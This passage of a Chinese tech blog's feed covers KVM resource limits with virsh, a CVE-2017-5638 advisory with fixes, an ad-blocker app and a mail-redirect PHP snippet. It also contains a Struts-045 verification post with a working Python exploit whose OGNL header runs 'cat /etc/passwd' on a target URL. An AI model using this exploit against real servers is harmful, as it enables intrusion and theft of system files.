<h3 id="添加网卡时对网卡带宽进行限制"><a href="#添加网卡时对网卡带宽进行限制" class="headerlink" title="添加网卡时对网卡带宽进行限制"></a>添加网卡时对网卡带宽进行限制</h3><p>命令行格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">attach-interface &lt;domain&gt; &lt;type&gt; &lt;source&gt; [&lt;target&gt;] [&lt;mac&gt;] [&lt;script&gt;] [&lt;model&gt;] [--persistent] [&lt;inbound&gt;] [&lt;outbound&gt;]</div></pre></td></tr></table></figure></p>
<p>命令行参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt; domain name, id or uuid</div><div class="line">[--type] &lt;string&gt; network interface type</div><div class="line">[--source] &lt;string&gt; source of network interface</div><div class="line">[--target] &lt;string&gt; target network name</div><div class="line">[--mac] &lt;string&gt; MAC address</div><div class="line">[--script] &lt;string&gt; script used to bridge network interface</div><div class="line">[--model] &lt;string&gt; model type</div><div class="line">--persistent persist interface attachment</div><div class="line">[--inbound] &lt;string&gt; control domain&apos;s incoming traffics</div><div class="line">[--outbound] &lt;string&gt; control domain&apos;s outgoing traffics</div></pre></td></tr></table></figure></p>
<h3 id="对已有网卡进行带宽限制"><a href="#对已有网卡进行带宽限制" class="headerlink" title="对已有网卡进行带宽限制"></a>对已有网卡进行带宽限制</h3><ul>
<li><p>命令格式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">domiftune &lt;domain&gt; &lt;interface&gt; [--inbound &lt;string&gt;] [--outbound &lt;string&gt;] [--config] [--live] [--current]</div></pre></td></tr></table></figure>
</li>
<li><p>参数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt;  domain name, id or uuid</div><div class="line">[--interface] &lt;string&gt;  interface device (MAC Address)</div><div class="line">--inbound &lt;string&gt;  control domain&apos;s incoming traffics</div><div class="line">--outbound &lt;string&gt;  control domain&apos;s outgoing traffics</div><div class="line">--config         affect next boot</div><div class="line">--live           affect running domain</div><div class="line">--current        affect current domain</div></pre></td></tr></table></figure>
</li>
<li><p>实例xml配置为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;bandwidth&gt;</div><div class="line">&lt;inbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;</div><div class="line">&lt;outbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;</div><div class="line">&lt;/bandwidth&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>注：单位kilobytes</p>
<h3 id="实测结果-1"><a href="#实测结果-1" class="headerlink" title="实测结果"></a>实测结果</h3><p>Libvirt实际也是使用TC，因为TC只能限制流出方向流量，不能限制流入方向，所以通过Libvirt限制流量，实际也只能限制流出方向。</p>
<ul>
<li>列举guest网卡列表：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">virsh domiflist netb2c</div><div class="line">Interface  Type       Source     Model       MAC</div><div class="line">-------------------------------------------------------</div><div class="line">vnet44     network    default    rtl8139     52:54:00:4a:61:6a</div></pre></td></tr></table></figure>
<ul>
<li><p>设定带宽限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh domiftune wpftest 52:54:00:3b:e2:a5 --inbound 1000 --outbound 1000 --live</div></pre></td></tr></table></figure>
</li>
<li><p>查看当前网卡带宽限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">virsh domiftune netb2c vnet44</div><div class="line">inbound.average: 1000</div><div class="line">inbound.peak   : 0</div><div class="line">inbound.burst  : 0</div><div class="line">outbound.average: 1000</div><div class="line">outbound.peak  : 0</div><div class="line">outbound.burst : 0</div></pre></td></tr></table></figure>
</li>
</ul>
<p>注：资源限制过程中，–interface可以是MAC地址也可以是设备名字，生产环境最好使用MAC地址进行限制。</p>
<hr>
<h2 id="三、CPU资源的控制"><a href="#三、CPU资源的控制" class="headerlink" title="三、CPU资源的控制"></a>三、CPU资源的控制</h2><p>对于CPU的资源控制可对实例CPU的权重进行调整，优化可对vcpu与cpu物理核心进行绑定已提升性能及减少宿主机的CPU压力。</p>
<p>命令行格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schedinfo &lt;domain&gt; [--weight &lt;number&gt;] [--cap &lt;number&gt;] [--current] [--config] [--live] [[--set] &lt;string&gt;]..</div></pre></td></tr></table></figure></p>
<p>参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt;  domain name, id or uuid</div><div class="line">--weight &lt;number&gt;  weight for XEN_CREDIT</div><div class="line">--cap &lt;number&gt;   cap for XEN_CREDIT</div><div class="line">--current        get/set current scheduler info</div><div class="line">--config         get/set value to be used on next boot</div><div class="line">--live           get/set value from running domain</div><div class="line">[--set] &lt;string&gt;  parameter=value</div></pre></td></tr></table></figure></p>
<p>实例xml配置为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;domain&gt;</div><div class="line">&lt;cputune&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;0&quot; cpuset=&quot;1-4,^2&quot;/&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;1&quot; cpuset=&quot;0,1&quot;/&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;2&quot; cpuset=&quot;2,3&quot;/&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;3&quot; cpuset=&quot;0,4&quot;/&gt;</div><div class="line">&lt;emulatorpin cpuset=&quot;1-3&quot;/&gt;</div><div class="line">&lt;shares&gt;2048&lt;/shares&gt;</div><div class="line">&lt;period&gt;1000000&lt;/period&gt;</div><div class="line">&lt;quota&gt;-1&lt;/quota&gt;</div><div class="line">&lt;emulator_period&gt;1000000&lt;/emulator_period&gt;</div><div class="line">&lt;emulator_quota&gt;-1&lt;/emulator_quota&gt;</div><div class="line">&lt;/cputune&gt;</div><div class="line">&lt;/domain&gt;</div></pre></td></tr></table></figure></p>
<p>主要参数说明：<br>shares cpu权重，没有固定的数值，和其他的虚拟机相比较，那个的数值大，那个可以使用的cpu资源就多，比如设置2048值得虚拟机，就比设置1024数值的虚拟机可以多使用2倍的cpu资源。<br>period vcpu强制间隔的时间周期，单位微秒，范围[1000, 1000000]，每一个vcpu不能使用超过period时间周期。<br>quota vcpu最大允许带宽，单位微秒，范围[1000, 18446744073709551]<br>emulator_period 强制间隔的时间周期，单位微妙，范围[1000, 1000000]，虚拟机进程(qemu)不能使用超过period时间周期。<br>emulator_quota 虚拟机进程(qemu)最大允许带宽，单位微妙，范围[1000, 18446744073709551]。</p>
<h3 id="实测结果-2"><a href="#实测结果-2" class="headerlink" title="实测结果"></a>实测结果</h3><p>对vcpu绑定有性能提升的效果，设置权重能控制CPU的资源利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">virsh schedinfo --set cpu_shares=500 netb2c</div><div class="line">Scheduler      : posix</div><div class="line">cpu_shares     : 500</div></pre></td></tr></table></figure></p>
<h2 id="四、内存资源的控制"><a href="#四、内存资源的控制" class="headerlink" title="四、内存资源的控制"></a>四、内存资源的控制</h2><p>使用memtune可对实例使用内存资源进行控制</p>
<ul>
<li>命令行格式为：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memtune &lt;domain&gt; [--hard-limit &lt;number&gt;] [--soft-limit &lt;number&gt;] [--swap-hard-limit &lt;number&gt;] [--min-guarantee &lt;number&gt;] [--config] [--live] [--current]</div></pre></td></tr></table></figure>
<ul>
<li>命令行参数：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt;  domain name, id or uuid</div><div class="line">--hard-limit &lt;number&gt;  Max memory, as scaled integer (default KiB)</div><div class="line">--soft-limit &lt;number&gt;  Memory during contention, as scaled integer (default KiB)</div><div class="line">--swap-hard-limit &lt;number&gt;  Max memory plus swap, as scaled integer (default KiB)</div><div class="line">--min-guarantee &lt;number&gt;  Min guaranteed memory, as scaled integer (default KiB)</div><div class="line">--config         affect next boot</div><div class="line">--live           affect running domain</div><div class="line">--current        affect current domain</div></pre></td></tr></table></figure>
<ul>
<li>实例xml配置为</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;memory unit=&apos;KiB&apos;&gt;2097152&lt;/memory&gt;</div><div class="line">&lt;currentMemory unit=&apos;KiB&apos;&gt;2097152&lt;/currentMemory&gt;</div><div class="line">&lt;memtune&gt;</div><div class="line">&lt;hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/hard_limit&gt;</div><div class="line">&lt;soft_limit unit=&apos;KiB&apos;&gt;8388608&lt;/soft_limit&gt;</div><div class="line">&lt;min_guarantee unit=&apos;Kib&apos;&gt;1024000&lt;/min_guarantee&gt;&gt;</div><div class="line">&lt;swap_hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/swap_hard_limit&gt;</div><div class="line">&lt;/memtune&gt;</div></pre></td></tr></table></figure>
<h3 id="实测结果-3"><a href="#实测结果-3" class="headerlink" title="实测结果"></a>实测结果</h3><p>内存可以限制住，但一旦实例内存超限，会导致实例内存溢出从而宕机。</p>
<ul>
<li><p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh memtune netb2c --hard-limit 4194304 --soft-limit 8388608 --swap-hard-limit 4194304 --live --config</div></pre></td></tr></table></figure>
</li>
<li><p>查看限制结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">virsh memtune netb2c</div><div class="line">hard_limit     : 4194304</div><div class="line">soft_limit     : 8388608</div><div class="line">swap_hard_limit: 4194304</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。&lt;br&gt;以下分享如何控制实例的资源使用，对实例使用资源进行控制。&lt;/p&gt;
&lt;h2 id=&quot;一、磁盘资源的控制&quot;&gt;&lt;a href=&quot;#一、磁盘资源的控
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="虚拟化" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
      <category term="KVM" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E8%99%9A%E6%8B%9F%E5%8C%96/KVM/"/>
    
    
      <category term="KVM" scheme="http://blog.unixmen.cn/tags/KVM/"/>
    
      <category term="资源限制" scheme="http://blog.unixmen.cn/tags/%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6/"/>
    
      <category term="性能优化" scheme="http://blog.unixmen.cn/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Struts-045 漏洞验证</title>
    <link href="http://blog.unixmen.cn/2017/03/07/Struts-045-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/"/>
    <id>http://blog.unixmen.cn/2017/03/07/Struts-045-漏洞验证/</id>
    <published>2017-03-07T08:20:18.000Z</published>
    <updated>2017-03-08T01:18:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Struts-045-漏洞验证及漏洞修复后测试"><a href="#Struts-045-漏洞验证及漏洞修复后测试" class="headerlink" title="Struts-045-漏洞验证及漏洞修复后测试"></a>Struts-045-漏洞验证及漏洞修复后测试</h1><p> 接上篇<br>注：本脚本仅为Struts-045漏洞验证及研究，严谨从事任何非法恶意操作。</p>
<h2 id="一、脚本信息"><a href="#一、脚本信息" class="headerlink" title="一、脚本信息"></a>一、脚本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/env python</div><div class="line"># encoding:utf-8</div><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">from poster.encode import multipart_encode</div><div class="line">from poster.streaminghttp import register_openers</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def poc():</div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;)</div><div class="line">    header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;</div><div class="line">    header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;cat /etc/passwd&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</div><div class="line">    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    print response.read()</div><div class="line"></div><div class="line"></div><div class="line">poc()</div></pre></td></tr></table></figure>
<h2 id="二、使用帮助"><a href="#二、使用帮助" class="headerlink" title="二、使用帮助"></a>二、使用帮助</h2><ul>
<li>将脚本命名为st-045.py</li>
<li>在工作目录创建 image1 和 tmp.txt两个空文件</li>
<li>执行 python st-045.py URL<br>如下图所示：<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc.png" alt=""><h2 id="三、漏洞修复后"><a href="#三、漏洞修复后" class="headerlink" title="三、漏洞修复后"></a>三、漏洞修复后</h2><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc_fixed.png" alt=""><br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc_fixed_1.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Struts-045-漏洞验证及漏洞修复后测试&quot;&gt;&lt;a href=&quot;#Struts-045-漏洞验证及漏洞修复后测试&quot; class=&quot;headerlink&quot; title=&quot;Struts-045-漏洞验证及漏洞修复后测试&quot;&gt;&lt;/a&gt;Struts-045-漏洞验证及漏
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://blog.unixmen.cn/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>关于Apache Struts2（S2-045）漏洞情况的通报</title>
    <link href="http://blog.unixmen.cn/2017/03/07/%E5%85%B3%E4%BA%8EApache-Struts2%EF%BC%88S2-045%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%83%85%E5%86%B5%E7%9A%84%E9%80%9A%E6%8A%A5/"/>
    <id>http://blog.unixmen.cn/2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/</id>
    <published>2017-03-07T07:28:49.000Z</published>
    <updated>2017-03-07T07:52:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>关于Apache Struts2 （S2-045）远程代码执行漏洞通报<br>近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（<a href="http://www.cnnvd.org.cn/vulnerability/show/cv_id/2017030152" target="_blank" rel="external">CNNVD-201703-152</a>）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下：</p>
<h1 id="一、-漏洞简介"><a href="#一、-漏洞简介" class="headerlink" title="一、 漏洞简介"></a>一、 漏洞简介</h1><p>Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。  </p>
<p>ApacheStruts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。    </p>
<h1 id="二、-漏洞危害"><a href="#二、-漏洞危害" class="headerlink" title="二、 漏洞危害"></a>二、 漏洞危害</h1><p>攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi ，debug等功能）以及启用任何插件，因此漏洞危害较为严重。</p>
<h1 id="三、-修复措施"><a href="#三、-修复措施" class="headerlink" title="三、 修复措施"></a>三、 修复措施</h1><p>目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。</p>
<ul>
<li>自查方式</li>
</ul>
<p>用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
<ul>
<li>升级修复</li>
</ul>
<p>受影响用户可升级版本至<a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32" target="_blank" rel="external">Apache Struts 2.3.32</a> 或 <a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1" target="_blank" rel="external">Apache Struts 2.5.10.1</a>以消除漏洞影响。</p>
<ul>
<li>临时缓解</li>
</ul>
<p>如用户不方便升级，可采取如下临时解决方案：</p>
<p> 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
<ul>
<li>相关链接<br>官方<a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">Aapache Struts2（S2-045）安全公告</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于Apache Struts2 （S2-045）远程代码执行漏洞通报&lt;br&gt;近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（&lt;a href=&quot;http://www.cnnvd.org.cn/vulnerabil
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://blog.unixmen.cn/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>广告拦截APP&quot;AdClear&quot; for 安卓/iOS</title>
    <link href="http://blog.unixmen.cn/2017/03/06/%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AAAPPADclear-for-%E5%AE%89%E5%8D%93-iOS/"/>
    <id>http://blog.unixmen.cn/2017/03/06/广告拦截APPADclear-for-安卓-iOS/</id>
    <published>2017-03-06T01:04:36.000Z</published>
    <updated>2017-03-06T06:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>良心广告拦截APP分享：<a href="http://seven-china.com/" target="_blank" rel="external">乐网</a>AdClear，视频APP无需会员过滤广告</p>
<ul>
<li>支持手机、平板</li>
<li>支持安卓、iOS</li>
<li>拦截系统内置广告</li>
<li>拦截视频软件广告</li>
<li>自身无广告</li>
<li>本地代理，建立VPN</li>
<li>无需root</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/adclear.png" alt=""></p>
<p>AppStore及安卓市场都可以搜到<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/adclearappstore.jpg" alt=""></p>
<p>从此观看视频一路畅通无阻。<br>Enjoy it！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;良心广告拦截APP分享：&lt;a href=&quot;http://seven-china.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;乐网&lt;/a&gt;AdClear，视频APP无需会员过滤广告&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持手机、平板&lt;/li&gt;
&lt;li&gt;支持
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
    
      <category term="手机APP" scheme="http://blog.unixmen.cn/tags/%E6%89%8B%E6%9C%BAAPP/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="广告拦截" scheme="http://blog.unixmen.cn/tags/%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AA/"/>
    
  </entry>
  
  <entry>
    <title>通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问</title>
    <link href="http://blog.unixmen.cn/2017/03/03/%E9%80%9A%E8%BF%87%E6%99%AF%E5%AE%89%E5%85%8D%E8%B4%B9%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%85%BE%E8%AE%AF%E5%85%8D%E8%B4%B9%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1%E7%BB%91%E5%AE%9A%E8%87%AA%E6%9C%89%E5%9F%9F%E5%90%8D%E7%99%BB%E9%99%86%E8%AE%BF%E9%97%AE/"/>
    <id>http://blog.unixmen.cn/2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/</id>
    <published>2017-03-03T03:53:41.000Z</published>
    <updated>2017-03-06T06:52:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段PHP代码即可。</p>
<p>由于一直用腾讯微信、QQ，所以就用了腾讯免费企业邮局，通过搜索了解到景安提供的有免费虚拟主机，所以就选择他了，，，，</p>
<p>准备工作：</p>
<ul>
<li>一个域名</li>
<li>已开通腾讯企业邮箱并设置正确解析</li>
<li>一个支持PHP的景安（免费）虚拟主机或者VPS</li>
</ul>
<h2 id="一、创建代码"><a href="#一、创建代码" class="headerlink" title="一、创建代码"></a>一、创建代码</h2><p>复制下面的代码，另存为index.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mail = file_get_contents(&quot;http://tel.exmail.qq.com/domain/mail.unixmen.cn&quot;);</div><div class="line">	echo $mail;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li>unixmen.cn 为开通腾讯企业邮箱时所用域名(请改为自己的顶级域名)</li>
<li>mail.unixmen.cn 为计划登陆访问时所用的域名</li>
</ul>
<h2 id="二、开通景安免费虚拟主机，绑定域名并解析"><a href="#二、开通景安免费虚拟主机，绑定域名并解析" class="headerlink" title="二、开通景安免费虚拟主机，绑定域名并解析"></a>二、开通<a href="http://www.zzidc.com/VirtualHost" target="_blank" rel="external">景安免费虚拟主机</a>，绑定域名并解析</h2><ul>
<li>开通主机<br>景安提供的有免费主机（下图左一）<br>建议：如果使用收费的虚拟主机，只做登陆邮箱调转试用，选个便宜的，够用就行，我选了一个最低配置（下图右一）一年才49，土豪请随意。</li>
</ul>
<hr>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_7.png" alt=""></p>
<hr>
<p>考虑到虚拟主机还有其他用途，索性就买了个收费的业务。</p>
<hr>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_3.png" alt=""></h2><p>注：无论是收费主机还是免费主机，以下操作或功能上没有区别。</p>
<ul>
<li>添加域名绑定<br>景安的虚拟主机如果不添加域名绑定，即便是解析正确，也无法访问，这个略屌。</li>
</ul>
<hr>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_9.png" alt=""></h2><ul>
<li>添加解析</li>
</ul>
<h2 id="添加MX记录及添加CNAME解析到景安提供的三级域名。"><a href="#添加MX记录及添加CNAME解析到景安提供的三级域名。" class="headerlink" title="添加MX记录及添加CNAME解析到景安提供的三级域名。"></a>添加MX记录及添加CNAME解析到景安提供的三级域名。</h2><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_5.png" alt=""></p>
<ul>
<li>解析生效</li>
</ul>
<hr>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_6.png" alt=""></p>
<h2 id="三、上传脚本程序"><a href="#三、上传脚本程序" class="headerlink" title="三、上传脚本程序"></a>三、上传脚本程序</h2><p>使用FTP工具或者文件管理器将步骤一中创建的index.php文件上传到WEB文件夹中</p>
<hr>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_8.png" alt=""></p>
<h2 id="四、测试访问"><a href="#四、测试访问" class="headerlink" title="四、测试访问"></a>四、测试访问</h2><p>如果上面的操作都没有错误的情况下，最后便可输入您的域名进行测试访问了，比如：mail.unixmen.cn<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_2.png" alt=""></p>
